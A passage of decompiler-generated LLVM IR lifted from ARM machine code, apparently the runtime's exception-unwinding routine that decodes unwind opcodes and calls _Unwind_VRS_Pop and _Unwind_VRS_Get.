  %v1_1afc0 = add nsw i32 %v4_1afac, -1
  store i32 %v1_1afc0, i32* %r3.global-to-local, align 4
  %v1_1afc4 = trunc i32 %v1_1afc0 to i8
  store i8 %v1_1afc4, i8* %v2_1afac, align 1
  %v0_1afc8 = load i32, i32* @r5, align 4
  %v1_1afc8 = add i32 %v0_1afc8, 4
  %v2_1afc8 = inttoptr i32 %v1_1afc8 to i32*
  %v3_1afc8 = load i32, i32* %v2_1afc8, align 4
  store i32 %v3_1afc8, i32* %r2.global-to-local, align 4
  %v1_1afcc = inttoptr i32 %v3_1afc8 to i32*
  %v2_1afcc = load i32, i32* %v1_1afcc, align 4
  store i32 %v2_1afcc, i32* %r0.global-to-local, align 4
  %v4_1afcc = add i32 %v3_1afc8, 4
  store i32 %v4_1afcc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1afcc, i32* %v2_1afc8, align 4
  %v0_1afd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1afd8 = trunc i32 %v0_1afd8 to i8
  %v2_1afd8 = load i32, i32* @r5, align 4
  %v3_1afd8 = add i32 %v2_1afd8, 8
  %v4_1afd8 = inttoptr i32 %v3_1afd8 to i8*
  store i8 %v1_1afd8, i8* %v4_1afd8, align 1
  %v0_1afdc = load i32, i32* %r0.global-to-local, align 4
  %v1_1afdc = load i32, i32* @r5, align 4
  %v2_1afdc = inttoptr i32 %v1_1afdc to i32*
  store i32 %v0_1afdc, i32* %v2_1afdc, align 4
  br label %dec_label_pc_1afe0

dec_label_pc_1afe0:                               ; preds = %.thread30, %dec_label_pc_1afc0
  %v0_1afe0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1afe0 = udiv i32 %v0_1afe0, 16777216
  %v1_1afe4 = urem i32 %v3_1afe0, 16
  %v3_1afe8 = mul i32 %v0_1afe0, 256
  store i32 %v3_1afe8, i32* %r0.global-to-local, align 4
  %v1_1afec = add nuw nsw i32 %v1_1afe4, 1
  store i32 %v1_1afec, i32* %r2.global-to-local, align 4
  %v1_1aff0 = and i32 %v3_1afe0, 240
  store i32 %v1_1aff0, i32* %r3.global-to-local, align 4
  %v1_1aff4 = load i32, i32* @r5, align 4
  %v2_1aff4 = inttoptr i32 %v1_1aff4 to i32*
  store i32 %v3_1afe8, i32* %v2_1aff4, align 4
  %v0_1aff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aff8 = load i32, i32* %r3.global-to-local, align 4
  %v4_1aff8 = mul i32 %v1_1aff8, 4096
  %v5_1aff8 = or i32 %v4_1aff8, %v0_1aff8
  br label %dec_label_pc_1affc

dec_label_pc_1affc:                               ; preds = %dec_label_pc_1afac, %dec_label_pc_1afe0
  %storemerge132 = phi i32 [ %v5_1aff8, %dec_label_pc_1afe0 ], [ 720897, %dec_label_pc_1afac ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1b004:                               ; preds = %dec_label_pc_1af90
  %v1_1b004 = and i32 %v0_1ac74, 252
  store i32 %v1_1b004, i32* %r3.global-to-local, align 4
  %v7_1b008 = icmp eq i32 %v1_1b004, 180
  store i1 %v7_1b008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b008, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1b004
  %v2_1b00c = urem i32 %v0_1ac74, 4
  %v2_1b014 = add nuw nsw i32 %v2_1b00c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1b020 = or i32 %v2_1b014, 262144
  store i32 %v2_1b020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1af1c

bb157:                                            ; preds = %dec_label_pc_1b004
  %v2_1b010 = urem i32 %v0_1af80, 8
  %v2_1b018 = add nuw nsw i32 %v2_1b010, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1b028 = or i32 %v2_1b018, 524288
  store i32 %v2_1b028, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1b030:                               ; preds = %dec_label_pc_1af40
  %v0_1b030 = load i32, i32* %ip.global-to-local, align 4
  %v7_1b030 = icmp eq i32 %v0_1b030, 198
  store i1 %v7_1b030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b030, label %dec_label_pc_1b038, label %dec_label_pc_1ae3c

dec_label_pc_1b038:                               ; preds = %dec_label_pc_1b030
  %v0_1b038 = load i32, i32* @r5, align 4
  %v1_1b038 = add i32 %v0_1b038, 8
  %v2_1b038 = inttoptr i32 %v1_1b038 to i8*
  %v3_1b038 = load i8, i8* %v2_1b038, align 1
  %v4_1b038 = zext i8 %v3_1b038 to i32
  store i32 %v4_1b038, i32* %r3.global-to-local, align 4
  %v2_1b03c = icmp eq i8 %v3_1b038, 0
  store i1 %v2_1b03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b03c, label %dec_label_pc_1b04c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1b038
  %v2_1b040 = add nsw i32 %v4_1b038, -1
  store i32 %v2_1b040, i32* %r3.global-to-local, align 4
  %v2_1b044 = trunc i32 %v2_1b040 to i8
  store i8 %v2_1b044, i8* %v2_1b038, align 1
  %v0_1b048.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b048.pr.pr, label %.thread48.dec_label_pc_1b04c_crit_edge, label %dec_label_pc_1b080

.thread48.dec_label_pc_1b04c_crit_edge:           ; preds = %.thread48
  %v0_1b04c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b04c

dec_label_pc_1b04c:                               ; preds = %.thread48.dec_label_pc_1b04c_crit_edge, %dec_label_pc_1b038
  %v2_1b064 = phi i32 [ %v0_1b04c.pre, %.thread48.dec_label_pc_1b04c_crit_edge ], [ %v0_1b038, %dec_label_pc_1b038 ]
  %v1_1b04c = add i32 %v2_1b064, 9
  %v2_1b04c = inttoptr i32 %v1_1b04c to i8*
  %v3_1b04c = load i8, i8* %v2_1b04c, align 1
  %v4_1b04c = zext i8 %v3_1b04c to i32
  store i32 %v4_1b04c, i32* %r3.global-to-local, align 4
  %v2_1b050 = icmp eq i8 %v3_1b04c, 0
  store i1 %v2_1b050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b050, label %dec_label_pc_1b09c, label %dec_label_pc_1b060

dec_label_pc_1b060:                               ; preds = %dec_label_pc_1b04c
  %v1_1b060 = add nsw i32 %v4_1b04c, -1
  store i32 %v1_1b060, i32* %r3.global-to-local, align 4
  %v1_1b064 = trunc i32 %v1_1b060 to i8
  store i8 %v1_1b064, i8* %v2_1b04c, align 1
  %v0_1b068 = load i32, i32* @r5, align 4
  %v1_1b068 = add i32 %v0_1b068, 4
  %v2_1b068 = inttoptr i32 %v1_1b068 to i32*
  %v3_1b068 = load i32, i32* %v2_1b068, align 4
  store i32 %v3_1b068, i32* %r2.global-to-local, align 4
  %v1_1b06c = inttoptr i32 %v3_1b068 to i32*
  %v2_1b06c = load i32, i32* %v1_1b06c, align 4
  store i32 %v2_1b06c, i32* %r0.global-to-local, align 4
  %v4_1b06c = add i32 %v3_1b068, 4
  store i32 %v4_1b06c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b06c, i32* %v2_1b068, align 4
  %v0_1b078 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b078 = trunc i32 %v0_1b078 to i8
  %v2_1b078 = load i32, i32* @r5, align 4
  %v3_1b078 = add i32 %v2_1b078, 8
  %v4_1b078 = inttoptr i32 %v3_1b078 to i8*
  store i8 %v1_1b078, i8* %v4_1b078, align 1
  %v0_1b07c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b07c = load i32, i32* @r5, align 4
  %v2_1b07c = inttoptr i32 %v1_1b07c to i32*
  store i32 %v0_1b07c, i32* %v2_1b07c, align 4
  br label %dec_label_pc_1b080

dec_label_pc_1b080:                               ; preds = %.thread48, %dec_label_pc_1b060
  %v0_1b080 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b080 = udiv i32 %v0_1b080, 16777216
  %v1_1b084 = urem i32 %v3_1b080, 16
  %v3_1b088 = mul i32 %v0_1b080, 256
  store i32 %v3_1b088, i32* %r0.global-to-local, align 4
  %v1_1b08c = add nuw nsw i32 %v1_1b084, 1
  store i32 %v1_1b08c, i32* %r2.global-to-local, align 4
  %v1_1b090 = and i32 %v3_1b080, 240
  store i32 %v1_1b090, i32* %r3.global-to-local, align 4
  %v1_1b094 = load i32, i32* @r5, align 4
  %v2_1b094 = inttoptr i32 %v1_1b094 to i32*
  store i32 %v3_1b088, i32* %v2_1b094, align 4
  %v0_1b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b098 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b098 = mul i32 %v1_1b098, 4096
  %v5_1b098 = or i32 %v4_1b098, %v0_1b098
  br label %dec_label_pc_1b09c

dec_label_pc_1b09c:                               ; preds = %dec_label_pc_1b04c, %dec_label_pc_1b080
  %storemerge131 = phi i32 [ %v5_1b098, %dec_label_pc_1b080 ], [ 720897, %dec_label_pc_1b04c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1b0a4:                               ; preds = %dec_label_pc_1ae60
  %v0_1b0a4 = load i32, i32* @r5, align 4
  %v1_1b0a4 = add i32 %v0_1b0a4, 8
  %v2_1b0a4 = inttoptr i32 %v1_1b0a4 to i8*
  %v3_1b0a4 = load i8, i8* %v2_1b0a4, align 1
  %v4_1b0a4 = zext i8 %v3_1b0a4 to i32
  store i32 %v4_1b0a4, i32* %r3.global-to-local, align 4
  %v2_1b0a8 = icmp eq i8 %v3_1b0a4, 0
  store i1 %v2_1b0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0a8, label %dec_label_pc_1b0b8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1b0a4
  %v2_1b0ac = add nsw i32 %v4_1b0a4, -1
  store i32 %v2_1b0ac, i32* %r3.global-to-local, align 4
  %v2_1b0b0 = trunc i32 %v2_1b0ac to i8
  store i8 %v2_1b0b0, i8* %v2_1b0a4, align 1
  %v0_1b0b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b0b4.pr.pr, label %.thread52.dec_label_pc_1b0b8_crit_edge, label %dec_label_pc_1b0ec

.thread52.dec_label_pc_1b0b8_crit_edge:           ; preds = %.thread52
  %v0_1b0b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b0b8

dec_label_pc_1b0b8:                               ; preds = %.thread52.dec_label_pc_1b0b8_crit_edge, %dec_label_pc_1b0a4
  %v2_1b0d0 = phi i32 [ %v0_1b0b8.pre, %.thread52.dec_label_pc_1b0b8_crit_edge ], [ %v0_1b0a4, %dec_label_pc_1b0a4 ]
  %v1_1b0b8 = add i32 %v2_1b0d0, 9
  %v2_1b0b8 = inttoptr i32 %v1_1b0b8 to i8*
  %v3_1b0b8 = load i8, i8* %v2_1b0b8, align 1
  %v4_1b0b8 = zext i8 %v3_1b0b8 to i32
  store i32 %v4_1b0b8, i32* %r3.global-to-local, align 4
  %v2_1b0bc = icmp eq i8 %v3_1b0b8, 0
  store i1 %v2_1b0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0bc, label %dec_label_pc_1b108, label %dec_label_pc_1b0cc

dec_label_pc_1b0cc:                               ; preds = %dec_label_pc_1b0b8
  %v1_1b0cc = add nsw i32 %v4_1b0b8, -1
  store i32 %v1_1b0cc, i32* %r3.global-to-local, align 4
  %v1_1b0d0 = trunc i32 %v1_1b0cc to i8
  store i8 %v1_1b0d0, i8* %v2_1b0b8, align 1
  %v0_1b0d4 = load i32, i32* @r5, align 4
  %v1_1b0d4 = add i32 %v0_1b0d4, 4
  %v2_1b0d4 = inttoptr i32 %v1_1b0d4 to i32*
  %v3_1b0d4 = load i32, i32* %v2_1b0d4, align 4
  store i32 %v3_1b0d4, i32* %r2.global-to-local, align 4
  %v1_1b0d8 = inttoptr i32 %v3_1b0d4 to i32*
  %v2_1b0d8 = load i32, i32* %v1_1b0d8, align 4
  store i32 %v2_1b0d8, i32* %r0.global-to-local, align 4
  %v4_1b0d8 = add i32 %v3_1b0d4, 4
  store i32 %v4_1b0d8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b0d8, i32* %v2_1b0d4, align 4
  %v0_1b0e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b0e4 = trunc i32 %v0_1b0e4 to i8
  %v2_1b0e4 = load i32, i32* @r5, align 4
  %v3_1b0e4 = add i32 %v2_1b0e4, 8
  %v4_1b0e4 = inttoptr i32 %v3_1b0e4 to i8*
  store i8 %v1_1b0e4, i8* %v4_1b0e4, align 1
  %v0_1b0e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b0e8 = load i32, i32* @r5, align 4
  %v2_1b0e8 = inttoptr i32 %v1_1b0e8 to i32*
  store i32 %v0_1b0e8, i32* %v2_1b0e8, align 4
  br label %dec_label_pc_1b0ec

dec_label_pc_1b0ec:                               ; preds = %.thread52, %dec_label_pc_1b0cc
  %v0_1b0ec = load i32, i32* %r0.global-to-local, align 4
  %v3_1b0ec = udiv i32 %v0_1b0ec, 16777216
  %v1_1b0f0 = urem i32 %v3_1b0ec, 16
  %v3_1b0f4 = mul i32 %v0_1b0ec, 256
  store i32 %v3_1b0f4, i32* %r0.global-to-local, align 4
  %v1_1b0f8 = add nuw nsw i32 %v1_1b0f0, 1
  store i32 %v1_1b0f8, i32* %r2.global-to-local, align 4
  %v1_1b0fc = and i32 %v3_1b0ec, 240
  store i32 %v1_1b0fc, i32* %r3.global-to-local, align 4
  %v1_1b100 = load i32, i32* @r5, align 4
  %v2_1b100 = inttoptr i32 %v1_1b100 to i32*
  store i32 %v3_1b0f4, i32* %v2_1b100, align 4
  %v0_1b104 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b104 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b104 = mul i32 %v1_1b104, 4096
  %v5_1b104 = or i32 %v4_1b104, %v0_1b104
  br label %dec_label_pc_1b108

dec_label_pc_1b108:                               ; preds = %dec_label_pc_1b0b8, %dec_label_pc_1b0ec
  %storemerge130 = phi i32 [ %v5_1b104, %dec_label_pc_1b0ec ], [ 720897, %dec_label_pc_1b0b8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af1c

dec_label_pc_1b110:                               ; preds = %dec_label_pc_1ae3c
  %v0_1b110 = load i32, i32* @r5, align 4
  %v1_1b110 = add i32 %v0_1b110, 8
  %v2_1b110 = inttoptr i32 %v1_1b110 to i8*
  %v3_1b110 = load i8, i8* %v2_1b110, align 1
  %v4_1b110 = zext i8 %v3_1b110 to i32
  store i32 %v4_1b110, i32* %r3.global-to-local, align 4
  %v2_1b114 = icmp eq i8 %v3_1b110, 0
  store i1 %v2_1b114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b114, label %dec_label_pc_1b2bc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1b110
  %v2_1b118 = add nsw i32 %v4_1b110, -1
  store i32 %v2_1b118, i32* %r3.global-to-local, align 4
  %v2_1b11c = trunc i32 %v2_1b118 to i8
  store i8 %v2_1b11c, i8* %v2_1b110, align 1
  %v0_1b120.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b120.pr.pr, label %.thread56.dec_label_pc_1b2bc_crit_edge, label %dec_label_pc_1b124

.thread56.dec_label_pc_1b2bc_crit_edge:           ; preds = %.thread56
  %v0_1b2bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b2bc

dec_label_pc_1b124:                               ; preds = %.thread56, %dec_label_pc_1b2c8
  %v0_1b124 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b124 = udiv i32 %v0_1b124, 16777216
  store i32 %v3_1b124, i32* %r3.global-to-local, align 4
  store i32 %v3_1b124, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1b124, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1b12c = mul i32 %v0_1b124, 256
  store i32 %v3_1b12c, i32* %r0.global-to-local, align 4
  %v1_1b130 = load i32, i32* @r5, align 4
  %v2_1b130 = inttoptr i32 %v1_1b130 to i32*
  store i32 %v3_1b12c, i32* %v2_1b130, align 4
  br i1 %tmp184, label %dec_label_pc_1aeec, label %dec_label_pc_1b138

dec_label_pc_1b138:                               ; preds = %dec_label_pc_1b124
  %v0_1b138 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b138 = and i32 %v0_1b138, 240
  store i32 %v1_1b138, i32* %r3.global-to-local, align 4
  %v2_1b138 = icmp eq i32 %v1_1b138, 0
  store i1 %v2_1b138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b138, label %dec_label_pc_1b140, label %dec_label_pc_1aeec

dec_label_pc_1b140:                               ; preds = %dec_label_pc_1b138
  %v0_1b140 = load i32, i32* @r7, align 4
  store i32 %v0_1b140, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1b148 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b148 = call i32 @_Unwind_VRS_Pop(i32 %v0_1b140, i32 4, i32 %v2_1b148, i32 0)
  store i32 %v4_1b148, i32* %r0.global-to-local, align 4
  %v2_1b14c = icmp eq i32 %v4_1b148, 0
  store i1 %v2_1b14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b14c, label %dec_label_pc_1ac1c.backedge, label %dec_label_pc_1b154

dec_label_pc_1b154:                               ; preds = %dec_label_pc_1b140
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad44

dec_label_pc_1b15c:                               ; preds = %dec_label_pc_1af88
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b168 = load i32, i32* @r7, align 4
  store i32 %v0_1b168, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1b174 = call i32 @_Unwind_VRS_Get(i32 %v0_1b168, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1b174, i32* %r0.global-to-local, align 4
  %v0_1b178 = load i32, i32* @r5, align 4
  %v1_1b178 = add i32 %v0_1b178, 8
  %v2_1b178 = inttoptr i32 %v1_1b178 to i8*
  %v3_1b178 = load i8, i8* %v2_1b178, align 1
  %v4_1b178 = zext i8 %v3_1b178 to i32
  store i32 %v4_1b178, i32* %r1.global-to-local, align 4
  %v2_1b17c = icmp eq i8 %v3_1b178, 0
  store i1 %v2_1b17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b17c, label %dec_label_pc_1b18c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1b15c
  %v2_1b180 = add nsw i32 %v4_1b178, -1
  store i32 %v2_1b180, i32* %r3.global-to-local, align 4
  %v2_1b184 = trunc i32 %v2_1b180 to i8
  store i8 %v2_1b184, i8* %v2_1b178, align 1
  %v0_1b188.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b188.pr.pr, label %.thread58.dec_label_pc_1b18c_crit_edge, label %dec_label_pc_1b1b8

.thread58.dec_label_pc_1b18c_crit_edge:           ; preds = %.thread58
  %v0_1b18c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b18c

dec_label_pc_1b18c:                               ; preds = %.thread58.dec_label_pc_1b18c_crit_edge, %dec_label_pc_1b15c
  %v2_1b1a0 = phi i32 [ %v0_1b18c.pre, %.thread58.dec_label_pc_1b18c_crit_edge ], [ %v0_1b178, %dec_label_pc_1b15c ]
  %v1_1b18c = add i32 %v2_1b1a0, 9
  %v2_1b18c = inttoptr i32 %v1_1b18c to i8*
  %v3_1b18c = load i8, i8* %v2_1b18c, align 1
  %v4_1b18c = zext i8 %v3_1b18c to i32
  store i32 %v4_1b18c, i32* %r3.global-to-local, align 4
  %v2_1b190 = icmp eq i8 %v3_1b18c, 0
  store i1 %v2_1b190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b190, label %bb158, label %dec_label_pc_1b19c

bb158:                                            ; preds = %dec_label_pc_1b18c
  %v1_1b194 = load i32, i32* @r6, align 4
  store i32 %v1_1b194, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b1e0

dec_label_pc_1b19c:                               ; preds = %dec_label_pc_1b18c
  %v1_1b19c = add nsw i32 %v4_1b18c, -1
  store i32 %v1_1b19c, i32* %r3.global-to-local, align 4
  %v1_1b1a0 = trunc i32 %v1_1b19c to i8
  store i8 %v1_1b1a0, i8* %v2_1b18c, align 1
  %v0_1b1a4 = load i32, i32* @r5, align 4
  %v1_1b1a4 = add i32 %v0_1b1a4, 4
  %v2_1b1a4 = inttoptr i32 %v1_1b1a4 to i32*
  %v3_1b1a4 = load i32, i32* %v2_1b1a4, align 4
  store i32 %v3_1b1a4, i32* %r2.global-to-local, align 4
  %v1_1b1a8 = inttoptr i32 %v3_1b1a4 to i32*
  %v2_1b1a8 = load i32, i32* %v1_1b1a8, align 4
  store i32 %v2_1b1a8, i32* %r0.global-to-local, align 4
  %v4_1b1a8 = add i32 %v3_1b1a4, 4
  store i32 %v4_1b1a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1b1b0 = inttoptr i32 %v0_1b1a4 to i32*
  store i32 %v2_1b1a8, i32* %v1_1b1b0, align 4
  %v5_1b1b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b1b0, i32* %v2_1b1a4, align 4
  %v0_1b1b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b1b4 = trunc i32 %v0_1b1b4 to i8
  %v2_1b1b4 = load i32, i32* @r5, align 4
  %v3_1b1b4 = add i32 %v2_1b1b4, 8
  %v4_1b1b4 = inttoptr i32 %v3_1b1b4 to i8*
  store i8 %v1_1b1b4, i8* %v4_1b1b4, align 1
  br label %dec_label_pc_1b1b8

dec_label_pc_1b1b8:                               ; preds = %.thread58, %dec_label_pc_1b19c
  %v0_1b1b8 = load i32, i32* @r5, align 4
  %v1_1b1b8 = inttoptr i32 %v0_1b1b8 to i32*
  %v2_1b1b8 = load i32, i32* %v1_1b1b8, align 4
  store i32 %v2_1b1b8, i32* %r3.global-to-local, align 4
  %v3_1b1bc = mul i32 %v2_1b1b8, 256
  store i32 %v3_1b1bc, i32* %r0.global-to-local, align 4
  %v3_1b1c0 = udiv i32 %v2_1b1b8, 16777216
  store i32 %v3_1b1c0, i32* %r2.global-to-local, align 4
  store i32 %v3_1b1bc, i32* %v1_1b1b8, align 4
  %v0_1b1c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b1c8 = and i32 %v0_1b1c8, 128
  %v2_1b1c8 = icmp eq i32 %v1_1b1c8, 0
  store i1 %v2_1b1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b1c8, label %.thread129, label %dec_label_pc_1b1dc

.thread129:                                       ; preds = %dec_label_pc_1b1b8
  %v4_1b1cc = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1b1cc, i32* %ip.global-to-local, align 4
  %v1_1b1d0 = urem i32 %v0_1b1c8, 256
  store i32 %v1_1b1d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1b250

dec_label_pc_1b1dc:                               ; preds = %dec_label_pc_1b1b8
  %v1_1b1d063 = urem i32 %v0_1b1c8, 256
  store i32 %v1_1b1d063, i32* %r2.global-to-local, align 4
  %v0_1b1dc = load i32, i32* @r5, align 4
  %v1_1b1dc = add i32 %v0_1b1dc, 8
  %v2_1b1dc = inttoptr i32 %v1_1b1dc to i8*
  %v3_1b1dc = load i8, i8* %v2_1b1dc, align 1
  %v4_1b1dc = zext i8 %v3_1b1dc to i32
  store i32 %v4_1b1dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b1e0

dec_label_pc_1b1e0:                               ; preds = %bb158, %dec_label_pc_1b1dc
  %v3_1b20099 = phi i32 [ %v2_1b1a0, %bb158 ], [ %v0_1b1dc, %dec_label_pc_1b1dc ]
  %v0_1b1e892 = phi i32 [ %v1_1b194, %bb158 ], [ %v1_1b1d063, %dec_label_pc_1b1dc ]
  %v3_1b1e0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1b1e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1b1e8

dec_label_pc_1b1e8:                               ; preds = %dec_label_pc_1b1e8.backedge, %dec_label_pc_1b1e0
  %v3_1b200 = phi i32 [ %v3_1b200100, %dec_label_pc_1b1e8.backedge ], [ %v3_1b20099, %dec_label_pc_1b1e0 ]
  %v0_1b1fc = phi i32 [ %v2_1b1ec.pre, %dec_label_pc_1b1e8.backedge ], [ 2, %dec_label_pc_1b1e0 ]
  %v0_1b1ec = phi i32 [ %v0_1b1ec.pre, %dec_label_pc_1b1e8.backedge ], [ %v3_1b1e0, %dec_label_pc_1b1e0 ]
  %v0_1b1e8 = phi i32 [ %v0_1b1e895, %dec_label_pc_1b1e8.backedge ], [ %v0_1b1e892, %dec_label_pc_1b1e0 ]
  %v1_1b1e8 = urem i32 %v0_1b1e8, 128
  %v7_1b1ec = shl i32 %v1_1b1e8, %v0_1b1fc
  %v8_1b1ec = add i32 %v7_1b1ec, %v0_1b1ec
  store i32 %v8_1b1ec, i32* %ip.global-to-local, align 4
  %v0_1b1f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b1f0 = icmp eq i32 %v0_1b1f0, 0
  store i1 %v2_1b1f0, i1* %cpsr_z.global-to-local, align 1
  %v1_1b1f4 = add i32 %v0_1b1f0, -1
  store i32 %v1_1b1f4, i32* %r3.global-to-local, align 4
  store i32 %v8_1b1ec, i32* %stack_var_-36, align 4
  %v1_1b1fc = add i32 %v0_1b1fc, 7
  store i32 %v1_1b1fc, i32* @lr, align 4
  br i1 %v2_1b1f0, label %dec_label_pc_1b208, label %bb159

bb159:                                            ; preds = %dec_label_pc_1b1e8
  %v2_1b200 = trunc i32 %v1_1b1f4 to i8
  %v4_1b200 = add i32 %v3_1b200, 8
  %v5_1b200 = inttoptr i32 %v4_1b200 to i8*
  store i8 %v2_1b200, i8* %v5_1b200, align 1
  %v0_1b204.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b204.pr, label %.dec_label_pc_1b208_crit_edge, label %dec_label_pc_1b234

.dec_label_pc_1b208_crit_edge:                    ; preds = %bb159
  %v0_1b208.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b208

dec_label_pc_1b208:                               ; preds = %.dec_label_pc_1b208_crit_edge, %dec_label_pc_1b1e8
  %v2_1b220 = phi i32 [ %v0_1b208.pre, %.dec_label_pc_1b208_crit_edge ], [ %v3_1b200, %dec_label_pc_1b1e8 ]
  %v1_1b208 = add i32 %v2_1b220, 9
  %v2_1b208 = inttoptr i32 %v1_1b208 to i8*
  %v3_1b208 = load i8, i8* %v2_1b208, align 1
  %v4_1b208 = zext i8 %v3_1b208 to i32
  store i32 %v4_1b208, i32* %r3.global-to-local, align 4
  %v2_1b20c = icmp eq i8 %v3_1b208, 0
  store i1 %v2_1b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_1b210 = add nsw i32 %v4_1b208, -1
  store i32 %v1_1b210, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1b20c, label %dec_label_pc_1b1e8.backedge, label %dec_label_pc_1b21c

dec_label_pc_1b21c:                               ; preds = %dec_label_pc_1b208
  %v1_1b21c = add i32 %v2_1b220, 4
  %v2_1b21c = inttoptr i32 %v1_1b21c to i32*
  %v3_1b21c = load i32, i32* %v2_1b21c, align 4
  store i32 %v3_1b21c, i32* %r2.global-to-local, align 4
  %v1_1b220 = trunc i32 %v1_1b210 to i8
  store i8 %v1_1b220, i8* %v2_1b208, align 1
  %v0_1b224 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b224 = inttoptr i32 %v0_1b224 to i32*
  %v2_1b224 = load i32, i32* %v1_1b224, align 4
  store i32 %v2_1b224, i32* %r0.global-to-local, align 4
  %v4_1b224 = add i32 %v0_1b224, 4
  store i32 %v4_1b224, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1b22c = load i32, i32* @r5, align 4
  %v3_1b22c = add i32 %v2_1b22c, 8
  %v4_1b22c = inttoptr i32 %v3_1b22c to i8*
  store i8 3, i8* %v4_1b22c, align 1
  %v0_1b230 = load i32, i32* @r5, align 4
  %v1_1b230 = inttoptr i32 %v0_1b230 to i32*
  %v2_1b230 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1b230, i32* %v1_1b230, align 4
  %v3_1b230 = add i32 %v0_1b230, 4
  %v4_1b230 = inttoptr i32 %v3_1b230 to i32*
  %v5_1b230 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b230, i32* %v4_1b230, align 4
  br label %dec_label_pc_1b234

dec_label_pc_1b234:                               ; preds = %bb159, %dec_label_pc_1b21c
  %v0_1b234 = load i32, i32* @r5, align 4
  %v1_1b234 = inttoptr i32 %v0_1b234 to i32*
  %v2_1b234 = load i32, i32* %v1_1b234, align 4
  store i32 %v2_1b234, i32* %r3.global-to-local, align 4
  %v3_1b238 = udiv i32 %v2_1b234, 16777216
  store i32 %v3_1b238, i32* %r2.global-to-local, align 4
